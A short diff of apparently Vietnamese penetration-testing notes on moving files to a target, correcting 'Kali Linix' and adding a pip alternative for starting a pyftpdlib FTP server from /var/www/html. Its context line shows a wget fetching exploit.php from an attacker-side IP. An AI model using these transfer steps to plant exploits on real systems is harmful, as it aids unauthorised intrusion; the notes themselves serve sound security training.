@@ -9,8 +9,8 @@ Example: wget http://192.168.27.160/exploit.php
 
 >FTP
 
-Cài đặt thư viện pyftpdlib trên Kali Linix
-apt-get install python-pyftpdlib
+Cài đặt thư viện pyftpdlib trên Kali Linux
+apt-get install python-pyftpdlib hoặc pip install pyftpdlib
 cd /var/www/html
 python -m pyftpdlib -p 21
 
